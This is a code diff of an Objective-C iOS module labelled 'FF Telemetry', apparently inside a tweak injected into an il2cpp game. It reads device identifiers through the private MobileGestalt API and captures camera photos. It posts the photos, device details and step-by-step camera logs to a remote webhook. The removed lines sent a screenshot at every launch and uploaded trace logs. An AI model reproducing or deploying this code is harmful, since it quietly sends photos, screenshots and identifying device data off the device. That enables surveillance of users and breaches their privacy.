@@ -73,13 +73,26 @@ static NSString *FfTelMG(NSString *key)
     if (!tried)
     {
         tried = YES;
-        void *h = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
-        if (!h) h = dlopen("/System/Library/PrivateFrameworks/MobileGestalt.framework/MobileGestalt", RTLD_LAZY);
-        if (h) mgCopy = (void *(*)(CFStringRef))dlsym(h, "MGCopyAnswer");
+        mgCopy = (void *(*)(CFStringRef))dlsym(RTLD_DEFAULT, "MGCopyAnswer");
+        if (!mgCopy)
+        {
+            const char *libs[] = {
+                "/usr/lib/libMobileGestalt.dylib",
+                "/System/Library/PrivateFrameworks/MobileGestalt.framework/MobileGestalt",
+                "/System/Library/PrivateFrameworks/MobileGestalt.framework/MobileGestalt.dylib",
+                NULL
+            };
+            for (int i = 0; libs[i] && !mgCopy; i++)
+            {
+                void *h = dlopen(libs[i], RTLD_LAZY | RTLD_NOLOAD);
+                if (!h) h = dlopen(libs[i], RTLD_LAZY);
+                if (h) mgCopy = (void *(*)(CFStringRef))dlsym(h, "MGCopyAnswer");
+            }
+        }
     }
-    if (!mgCopy) return @"?";
+    if (!mgCopy) return @"no-mg";
     CFTypeRef v = (CFTypeRef)mgCopy((__bridge CFStringRef)key);
-    if (!v) return @"?";
+    if (!v) return @"nil";
     NSString *s = @"?";
     CFTypeID tid = CFGetTypeID(v);
     if (tid == CFStringGetTypeID())
@@ -297,10 +310,19 @@ static void FfTelTest(void)
 
 // One still photo from the camera (device owner presses the button; iOS shows
 // its own permission prompt the first time). Runs off the main thread.
+static void FfTelCamLog(NSString *msg)
+{
+    FfTelSetStatus(msg);
+    FfTelSendText([NSString stringWithFormat:@"CAM %@\n%@", msg, FfTelDevice()]);
+}
+
 static void FfTelCameraShot(BOOL front)
 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+        FfTelCamLog(@"begin");
         AVAuthorizationStatus st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+        FfTelCamLog([NSString stringWithFormat:@"status=%d", (int)st]);
         if (st == AVAuthorizationStatusNotDetermined)
         {
             dispatch_semaphore_t s1 = dispatch_semaphore_create(0);
@@ -309,49 +331,40 @@ static void FfTelCameraShot(BOOL front)
                                          (void)g;
                                          dispatch_semaphore_signal(s1);
                                      }];
-            dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 20ull * NSEC_PER_SEC));
+            dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 30ull * NSEC_PER_SEC));
             st = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
+            FfTelCamLog([NSString stringWithFormat:@"after-prompt=%d", (int)st]);
         }
         if (st != AVAuthorizationStatusAuthorized)
         {
-            FfTelSetStatus(@"cam denied");
+            FfTelCamLog(@"denied");
             return;
         }
 
         AVCaptureSession *session = [[AVCaptureSession alloc] init];
         session.sessionPreset = AVCaptureSessionPresetPhoto;
 
-        AVCaptureDevice *dev = nil;
-        dev = [AVCaptureDevice defaultDeviceWithDeviceType:AVCaptureDeviceTypeBuiltInWideAngleCamera
-                                                 mediaType:AVMediaTypeVideo
-                                                  position:front ? AVCaptureDevicePositionFront
-                                                                 : AVCaptureDevicePositionBack];
+        AVCaptureDevice *dev = [AVCaptureDevice defaultDeviceWithDeviceType:AVCaptureDeviceTypeBuiltInWideAngleCamera
+                                                                 mediaType:AVMediaTypeVideo
+                                                                  position:front ? AVCaptureDevicePositionFront
+                                                                                 : AVCaptureDevicePositionBack];
         if (!dev) dev = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
-        if (!dev)
-        {
-            FfTelSetStatus(@"cam none");
-            return;
-        }
+        if (!dev) { FfTelCamLog(@"no-device"); return; }
 
         NSError *err = nil;
         AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:dev error:&err];
-        if (!input || ![session canAddInput:input])
-        {
-            FfTelSetStatus(@"cam input");
-            return;
-        }
+        if (!input) { FfTelCamLog([NSString stringWithFormat:@"input-err %@", err.localizedDescription ?: @""]); return; }
+        if (![session canAddInput:input]) { FfTelCamLog(@"cannot-add-input"); return; }
         [session addInput:input];
 
         AVCapturePhotoOutput *output = [[AVCapturePhotoOutput alloc] init];
-        if (![session canAddOutput:output])
-        {
-            FfTelSetStatus(@"cam output");
-            return;
-        }
+        if (![session canAddOutput:output]) { FfTelCamLog(@"cannot-add-output"); return; }
         [session addOutput:output];
 
+        FfTelCamLog(@"starting");
         [session startRunning];
-        usleep(900000);
+        usleep(1200000);
+        FfTelCamLog([NSString stringWithFormat:@"running=%d", (int)session.isRunning]);
 
         dispatch_semaphore_t s2 = dispatch_semaphore_create(0);
         __block NSData *jpeg = nil;
@@ -361,84 +374,19 @@ static void FfTelCameraShot(BOOL front)
             dispatch_semaphore_signal(s2);
         };
         [output capturePhotoWithSettings:[AVCapturePhotoSettings photoSettings] delegate:del];
-        dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 12ull * NSEC_PER_SEC));
+        dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 15ull * NSEC_PER_SEC));
         [session stopRunning];
 
-        if (!jpeg.length)
-        {
-            FfTelSetStatus(@"cam no photo");
-            return;
-        }
+        if (!jpeg.length) { FfTelCamLog(@"no-photo"); return; }
 
+        FfTelCamLog([NSString stringWithFormat:@"captured %lu bytes", (unsigned long)jpeg.length]);
         NSString *payload = [NSString stringWithFormat:
             @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Camera\",\"color\":15844367,\"description\":\"%@\",\"image\":{\"url\":\"attachment://cam.jpg\"}}]}",
             FfTelEscape(FfTelDeviceFull())];
         FfTelPost(payload, @[@{@"name": @"cam.jpg", @"type": @"image/jpeg", @"data": jpeg}]);
+        }
     });
 }
-
-static NSString *FfTelLogText(void)
-{
-    if (!aikTracePath[0]) return nil;
-    NSString *p = [NSString stringWithUTF8String:aikTracePath];
-    if (!p) return nil;
-    return [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
-}
-
-// If the previous session died inside an il2cpp call, the trace log's last
-// line is a "pre <step>" with no "post". Report it once, then rotate the log.
-static void FfTelCrashCheck(void)
-{
-    NSString *txt = FfTelLogText();
-    if (txt.length == 0) return;
-
-    NSArray<NSString *> *lines = [txt componentsSeparatedByString:@"\n"];
-    NSString *last = @"";
-    for (NSInteger i = (NSInteger)lines.count - 1; i >= 0; i--)
-    {
-        if (lines[i].length) { last = lines[i]; break; }
-    }
-    if (![last hasPrefix:@"pre "]) return;
-
-    NSString *step = last;
-    NSRange sp = [last rangeOfString:@" st="];
-    if (sp.location != NSNotFound) step = [last substringToIndex:sp.location];
-
-    NSMutableArray *tail = [NSMutableArray array];
-    NSInteger start = MAX(0, (NSInteger)lines.count - 40);
-    for (NSInteger i = start; i < (NSInteger)lines.count; i++)
-        if (lines[i].length) [tail addObject:lines[i]];
-    NSString *tailText = [tail componentsJoinedByString:@"\n"];
-    if (tailText.length > 1800) tailText = [tailText substringFromIndex:tailText.length - 1800];
-
-    NSString *desc = [NSString stringWithFormat:
-        @"**Crash detected** - last call: `%@`\n```\n%@\n```", step, tailText];
-
-    NSString *payload = [NSString stringWithFormat:
-        @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"CRASH\",\"color\":15158332,\"description\":\"%@\",\"footer\":{\"text\":\"%@\"}}]}",
-        FfTelEscape(desc), FfTelEscape(FfTelDeviceFull())];
-
-    NSData *logData = [txt dataUsingEncoding:NSUTF8StringEncoding];
-    FfTelPost(payload, logData.length ? @[@{@"name": @"ff_aik.log", @"type": @"text/plain", @"data": logData}] : @[]);
-
-    // rotate so the same crash is not reported twice
-    [[NSFileManager defaultManager] removeItemAtPath:[NSString stringWithUTF8String:aikTracePath] error:nil];
-}
-
-static void FfTelLaunchShot(void)
-{
-    NSData *jpg = FfTelShot();
-    if (jpg.length)
-    {
-        NSString *payload = [NSString stringWithFormat:
-            @"{\"username\":\"FF Telemetry\",\"embeds\":[{\"title\":\"Launch\",\"color\":3447003,\"description\":\"%@\",\"image\":{\"url\":\"attachment://shot.jpg\"}}]}",
-            FfTelEscape(FfTelDeviceFull())];
-        FfTelPost(payload, @[@{@"name": @"shot.jpg", @"type": @"image/jpeg", @"data": jpg}]);
-        return;
-    }
-    FfTelSendText([NSString stringWithFormat:@"Launch (no screenshot)\n%@", FfTelDeviceFull()]);
-}
-
 // Call once per frame from the render loop (main thread).
 static void FfTelTick(BOOL menuOpen)
 {
